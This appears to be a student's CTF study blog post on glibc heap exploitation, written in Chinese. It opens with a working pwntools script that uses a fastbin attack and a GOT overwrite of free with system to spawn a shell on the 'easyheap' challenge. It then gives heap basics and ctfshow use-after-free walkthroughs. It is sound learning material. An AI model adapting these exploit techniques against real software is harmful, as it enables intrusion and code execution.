<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#io=process(&quot;easyheap&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29842</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;easyheap&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content of heap:&quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content of heap : &quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;happy&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;happy&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;happy&quot;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> +<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6020ad</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;happy&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;happy&quot;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x23</span>+p64(elf.got[<span class="string">&quot;free&quot;</span>])</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload2),payload2)</span><br><span class="line">payload3=p64(elf.plt[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload3),payload3)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>进入2025的暑假了🎉，感觉最近学re和misc比较多🛡️🧩，pwn也写了一些🔥，可是绩点掉了不少📉，主包下定决心这个暑假一定好好学pwn💪而且一定要卷回绩点🚀，fighting👊！现在开始heap的正式学习📚➡️🧠</p>
<h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><h3 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆?"></a>什么是堆?</h3><p>堆是操作系统提供给程序的一块<strong>动态分配</strong>的内存区域。它的大小通常远大于栈。</p>
<p>其内存分配通常<strong>向上增长</strong>（从低地址向高地址）。</p>
<h3 id="堆的结构"><a href="#堆的结构" class="headerlink" title="堆的结构"></a>堆的结构</h3><p>代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123; </span><br><span class="line">    <span class="type">char</span>* ptr;</span><br><span class="line">    ptr = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">20</span>); </span><br><span class="line">    <span class="built_in">strcpy</span>(ptr, argv[<span class="number">1</span>]); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, ptr);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从代码中我们就可以看出堆的空间是由malloc函数分配的。</p>
<p>那malloc()是什么样的呢</p>
<p>它向操作系统请求在<strong>堆</strong>上分配一块<strong>连续</strong>的、指定大小的内存区域。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void *malloc(size_t size); #size_t size：这是唯一的参数，表示你需要分配的内存块的字节数。</span><br></pre></td></tr></table></figure>

<p>堆内存整体布局:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">低地址                                     高地址</span><br><span class="line">┌───────────────┬─────────────────┬─────────────────┬─────────────────┐</span><br><span class="line">│  已分配Chunk A │   空闲Chunk B   │  已分配Chunk C  │     Top Chunk   │</span><br><span class="line">├───────────────┼─────────────────┼─────────────────┼─────────────────┤</span><br><span class="line">│ prev_size=0   │ prev_size=0     │ prev_size=0     │ prev_size=...   │</span><br><span class="line">│ size=0x21     │ size=0x41       │ size=0x31       │ size=0x20d01    │</span><br><span class="line">│ user_data[...]│ FD=0xabcdef00   │ user_data[...]  │ (未分配空间)    │</span><br><span class="line">│               │ BK=0x12345678   │                 │                 │</span><br><span class="line">└───────────────┴─────────────────┴─────────────────┴─────────────────┘</span><br></pre></td></tr></table></figure>

<p>已分配Chunk:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌───────────────────────────┐</span><br><span class="line">│        prev_size          │ ◄── 如果前一个chunk空闲，存储其大小</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│         size              │ ◄── 当前大小 + 标志位 (e.g. 0x20 | PREV_INUSE)</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│                           │</span><br><span class="line">│        User Data          │ ◄── 应用程序实际使用的区域</span><br><span class="line">│         (可溢出)          │</span><br><span class="line">│                           │</span><br><span class="line">└───────────────────────────┘</span><br></pre></td></tr></table></figure>

<p>空闲Chunk (在bins中)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌───────────────────────────┐</span><br><span class="line">│        prev_size          │</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│         size              │</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│         FD (fd)           │ ◄── 指向同bin中下一个空闲chunk</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│         BK (bk)           │ ◄── 指向同bin中上一个空闲chunk</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│                           │</span><br><span class="line">│    Unused Data Space      │ ◄── 可被元数据复用</span><br><span class="line">│                           │</span><br><span class="line">└───────────────────────────┘</span><br></pre></td></tr></table></figure>



<h3 id="还有一个很重要的就是了解chunk了"><a href="#还有一个很重要的就是了解chunk了" class="headerlink" title="还有一个很重要的就是了解chunk了"></a>还有一个很重要的就是了解chunk了</h3><p>源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">  <span class="type">size_t</span>      prev_size;   <span class="comment">// 前一个chunk的大小（若前一个chunk空闲）</span></span><br><span class="line">  <span class="type">size_t</span>      size;        <span class="comment">// 当前chunk的大小 + 状态标志位</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span> <span class="comment">// 空闲chunk：指向链表中下一个chunk（仅当空闲时有效）</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span> <span class="comment">// 空闲chunk：指向链表中前一个chunk（仅当空闲时有效）</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>chunk的结构大致也了解了，就开始了解堆溢出了</p>
<h3 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h3><h4 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h4><p>看了几篇uaf的文章，感觉不是很理解，对很多指针和结构体还不是很清楚，还需继续了解，于是我决定先去ctfshow了解一下堆利用的前置基础知识。</p>
<p><a href="https://ctf.show/challenges">前置基础知识</a></p>
<p>pwn135</p>
<p>介绍了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="built_in">malloc</span>     <span class="type">void</span>* <span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="number">2.</span> <span class="built_in">calloc</span>     <span class="type">void</span>* <span class="title function_">calloc</span><span class="params">(<span class="type">size_t</span> num, <span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="number">3.</span> <span class="built_in">realloc</span>    <span class="type">void</span>* <span class="title function_">realloc</span><span class="params">(<span class="type">void</span>* ptr, <span class="type">size_t</span> new_size)</span>;</span><br></pre></td></tr></table></figure>

<p>开始了解这三个函数</p>
<p>关键区别总结</p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">初始化</th>
<th align="left">参数形式</th>
<th align="left">主要用途</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>malloc</code></td>
<td align="left">否</td>
<td align="left"><code>size</code>（总字节数）</td>
<td align="left">分配未初始化内存</td>
</tr>
<tr>
<td align="left"><code>calloc</code></td>
<td align="left">是（0）</td>
<td align="left"><code>num, size</code>（元素信息）</td>
<td align="left">分配并初始化归零的内存</td>
</tr>
<tr>
<td align="left"><code>realloc</code></td>
<td align="left">部分</td>
<td align="left"><code>ptr, new_size</code></td>
<td align="left">调整已分配内存的大小</td>
</tr>
</tbody></table>
<p>这题输入4就可以得到flag</p>
<p>pwn136</p>
<p>介绍了free这个函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *ptr)</span>;  <span class="comment">//参数：ptr - 指向先前分配的内存块的指针</span></span><br></pre></td></tr></table></figure>

<p>如果 <code>ptr</code> 是 <code>NULL</code>：函数不执行任何操作（安全）,如果不是NULL就存在UAF漏洞了</p>
<p>这题输入4就可以得到flag</p>
<p>pwn137</p>
<p>介绍了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">getpid() <span class="type">pid_t</span> <span class="title function_">getpid</span><span class="params">(<span class="type">void</span>)</span>;    <span class="comment">//每个进程在创建时会被分配一个唯一的正整数作为PID。</span></span><br><span class="line">sbrk()         <span class="type">void</span> *<span class="title function_">sbrk</span><span class="params">(<span class="type">intptr_t</span> increment)</span>;   <span class="comment">//increment：字节增量（正数扩展堆，负数收缩堆，0 获取当前堆顶）。</span></span><br><span class="line">brk()          <span class="type">int</span> <span class="title function_">brk</span><span class="params">(<span class="type">void</span> *addr)</span>;  addr： <span class="comment">//目标堆结束地址（指针）。</span></span><br></pre></td></tr></table></figure>

<p>直接运行得到flag</p>
<p>pwn138</p>
<p>介绍了mmap</p>
<p>mmap()函数原型</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags, <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span>;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left"><strong>参数</strong></th>
<th align="left"><strong>类型</strong></th>
<th align="left"><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>addr</code></td>
<td align="left"><code>void*</code></td>
<td align="left">建议的映射起始地址（通常设为<code>NULL</code>，由内核决定）</td>
</tr>
<tr>
<td align="left"><code>length</code></td>
<td align="left"><code>size_t</code></td>
<td align="left">映射区域的长度（字节）</td>
</tr>
<tr>
<td align="left"><code>prot</code></td>
<td align="left"><code>int</code></td>
<td align="left">内存保护标志（控制访问权限）</td>
</tr>
<tr>
<td align="left"><code>flags</code></td>
<td align="left"><code>int</code></td>
<td align="left">映射类型和特性标志</td>
</tr>
<tr>
<td align="left"><code>fd</code></td>
<td align="left"><code>int</code></td>
<td align="left">文件描述符（匿名映射时设为<code>-1</code>）</td>
</tr>
<tr>
<td align="left"><code>offset</code></td>
<td align="left"><code>off_t</code></td>
<td align="left">文件映射的起始偏移量（必须是页大小的整数倍）</td>
</tr>
</tbody></table>
<p>prot保护标志（位掩码组合）</p>
<table>
<thead>
<tr>
<th align="left">标志</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>PROT_READ</code></td>
<td align="left">页面可读</td>
</tr>
<tr>
<td align="left"><code>PROT_WRITE</code></td>
<td align="left">页面可写</td>
</tr>
<tr>
<td align="left"><code>PROT_EXEC</code></td>
<td align="left">页面可执行</td>
</tr>
<tr>
<td align="left"><code>PROT_NONE</code></td>
<td align="left">页面不可访问（用于防护）</td>
</tr>
</tbody></table>
<p>pwn139</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//fseek() </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">fseek</span><span class="params">(FILE *stream, <span class="type">long</span> offset, <span class="type">int</span> whence)</span>;</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>stream</code></td>
<td align="left"><code>FILE*</code></td>
<td align="left">指向文件对象的指针</td>
</tr>
<tr>
<td align="left"><code>offset</code></td>
<td align="left"><code>long</code></td>
<td align="left">偏移字节数（可为负数）</td>
</tr>
<tr>
<td align="left"><code>whence</code></td>
<td align="left"><code>int</code></td>
<td align="left">基准位置： <code>SEEK_SET</code>(文件头) <code>SEEK_CUR</code>(当前位置) <code>SEEK_END</code>(文件尾)</td>
</tr>
</tbody></table>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fseek(fp, <span class="number">100</span>, SEEK_SET);   <span class="comment">// 移动到文件头后100字节处</span></span><br><span class="line">fseek(fp, <span class="number">-50</span>, SEEK_CUR);   <span class="comment">// 从当前位置回退50字节</span></span><br><span class="line">fseek(fp, <span class="number">-20</span>, SEEK_END);   <span class="comment">// 移动到文件尾前20字节处</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ftell()</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">ftell</span><span class="params">(FILE *stream)</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//fread()</span></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">fread</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *stream)</span>;</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>ptr</code></td>
<td align="left"><code>void*</code></td>
<td align="left">目标缓冲区指针</td>
</tr>
<tr>
<td align="left"><code>size</code></td>
<td align="left"><code>size_t</code></td>
<td align="left">每个元素的字节大小</td>
</tr>
<tr>
<td align="left"><code>nmemb</code></td>
<td align="left"><code>size_t</code></td>
<td align="left">要读取的元素数量</td>
</tr>
<tr>
<td align="left"><code>stream</code></td>
<td align="left"><code>FILE*</code></td>
<td align="left">文件流指针</td>
</tr>
</tbody></table>
<p>Arena 本质：将全局堆内存划分为多个独立区域，每个线程绑定到特定 Arena，实现无锁分配。</p>
<p>一个线程只能有一个arena，而且每个arena都是独立且不相同的。</p>
<p>主线程的arena叫做main_arena,子线程的arena叫做thread_arena。</p>
<p>pwn140</p>
<p>pthread_create() - 线程创建函数</p>
<p>功能：创建新的执行线程</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_create</span><span class="params">(<span class="type">pthread_t</span> *thread, <span class="type">const</span> <span class="type">pthread_attr_t</span> *attr,</span></span><br><span class="line"><span class="params">                   <span class="type">void</span> *(*start_routine)(<span class="type">void</span> *), <span class="type">void</span> *arg)</span>;</span><br></pre></td></tr></table></figure>

<p>参数解析：</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>thread</code></td>
<td align="left"><code>pthread_t *</code></td>
<td align="left">输出参数，存储新线程的 ID</td>
</tr>
<tr>
<td align="left"><code>attr</code></td>
<td align="left"><code>const pthread_attr_t *</code></td>
<td align="left">线程属性（NULL 表示默认属性）</td>
</tr>
<tr>
<td align="left"><code>start_routine</code></td>
<td align="left"><code>void *(*)(void *)</code></td>
<td align="left">线程入口函数（函数指针）</td>
</tr>
<tr>
<td align="left"><code>arg</code></td>
<td align="left"><code>void *</code></td>
<td align="left">传递给入口函数的参数</td>
</tr>
</tbody></table>
<p>二、pthread_join() - 线程等待函数</p>
<p>功能：阻塞当前线程，直到目标线程结束</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_join</span><span class="params">(<span class="type">pthread_t</span> thread, <span class="type">void</span> **retval)</span>;</span><br></pre></td></tr></table></figure>

<p>参数解析：</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>thread</code></td>
<td align="left"><code>pthread_t</code></td>
<td align="left">要等待的线程 ID</td>
</tr>
<tr>
<td align="left"><code>retval</code></td>
<td align="left"><code>void **</code></td>
<td align="left">存储线程返回值（NULL 表示不关心返回值）</td>
</tr>
</tbody></table>
<p>今天pwn就学到这里了💻，去写写web大作业了🌐，明天就进入pwn141🚀，去学习一下简单的uaf💣，争取开始写堆题⛏️！</p>
<p>pwn141</p>
<p>开始了第一个UAF了。</p>
<p>首先我了解了一下，一些知识：</p>
<ol>
<li><p>UAF漏洞首先需要出现free后的指针没有指向NULL</p>
</li>
<li><p>当指针没有指向NULL的时候，此时我们free后再次申请一个和它同样大小的堆的话，会直接把之前的内存直接分给我们这次申请的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">比如第一次申请16字节的内存chunk1，free(释放)后，如果指针没有指向NULL，free只能把chunk放入bin，但是指针还是指向堆块的。</span><br><span class="line">此时我们只要再次申请和上个堆块一样的内存大小，此时就会把上次的chunk1的内存风给我们了，称后申请为chunk2，此时我们修改chunk2就是在改chunk1了。</span><br></pre></td></tr></table></figure></li>
</ol>
<p>主函数：</p>
<p><img src="/2025/03/15/heap%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/ctfshow141.1.png" alt="2"></p>
<p>print_note():</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">unsigned <span class="built_in">int</span> print_note()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> v1; // [esp+4h] [ebp-14h]</span><br><span class="line">  char buf[<span class="number">4</span>]; // [esp+8h] [ebp-10h] BYREF</span><br><span class="line">  unsigned <span class="built_in">int</span> v3; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, 4u);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)&amp;notelist + v1) )</span><br><span class="line">    (**((void (__cdecl ***)(_DWORD))&amp;notelist + v1))(*((_DWORD *)&amp;notelist + v1));</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我感觉这一部分有点没理解用deepseek解释一下,下面是上面的等价看的更清楚点</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)&amp;notelist + v1) )</span><br><span class="line">    (**((<span class="type">void</span> (__cdecl ***)(_DWORD))&amp;notelist + v1))(*((_DWORD *)&amp;notelist + v1));</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------    <span class="comment">// 获取第v1个元素</span></span><br><span class="line">FuncPtr **element = &amp;notelist[v1]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (*element != <span class="literal">NULL</span>) &#123;        <span class="comment">// 检查一级指针是否有效</span></span><br><span class="line">    FuncPtr func = **element;  <span class="comment">// 解引用两次获取函数地址</span></span><br><span class="line">    func(*element);            <span class="comment">// 调用函数，传入*element作为参数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>add一次会申请两次(待会看add函数)chunk第一次就作为函数地址，第二个就作为参数。</p>
<p>add_note()</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">add_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [esp+14h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( count &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*((_DWORD *)&amp;notelist + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *((_DWORD *)&amp;notelist + i) = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !*((_DWORD *)&amp;notelist + i) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        **((_DWORD **)&amp;notelist + i) = print_note_content;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">8u</span>);</span><br><span class="line">        size = atoi(buf);</span><br><span class="line">        v0 = *((_DWORD *)&amp;notelist + i);</span><br><span class="line">        *(_DWORD *)(v0 + <span class="number">4</span>) = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !*(_DWORD *)(*((_DWORD *)&amp;notelist + i) + <span class="number">4</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, *(<span class="type">void</span> **)(*((_DWORD *)&amp;notelist + i) + <span class="number">4</span>), size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14u</span>) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Full!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14u</span>) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>print_note_content</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">print_note_content</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">4</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>print_note_content其实就是个puts函数。add_note()每次都会申请两个堆块。</p>
<p>del_note();</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">del_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)&amp;notelist + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)(*((_DWORD *)&amp;notelist + v1) + <span class="number">4</span>));</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;notelist + v1));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到free最后指针没有指向NULL，存在UAF漏洞。</p>
<p>use()</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">use</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat /ctfshow_flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里还有个后门函数。</p>
<p>分析到这里我们就可以来构造攻击思路了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先我们要申请两个堆块(因为我们修改chunk的时候，add会会申请两个堆块一个用来存储print_note_content的地址，一个用来存储content).</span><br><span class="line">先申请两次add,就是4个堆块</span><br><span class="line">chunk0 -------&gt;指向print_note_content  8字节</span><br><span class="line">chunk0.0: ----&gt;指向content0            大于8字节即可 </span><br><span class="line">chunk1 -------&gt;指向print_note_content  8字节</span><br><span class="line">chunk1.1 -----&gt;指向content1            大于8字节即可</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------</span><br><span class="line">free 0和1后</span><br><span class="line">chunk2 -------&gt;chunk1    8字节</span><br><span class="line">chunk2.2 -----&gt;chunk0    8字节   此时输入use的地址就可将其覆改从而执行use，getshell</span><br></pre></td></tr></table></figure>

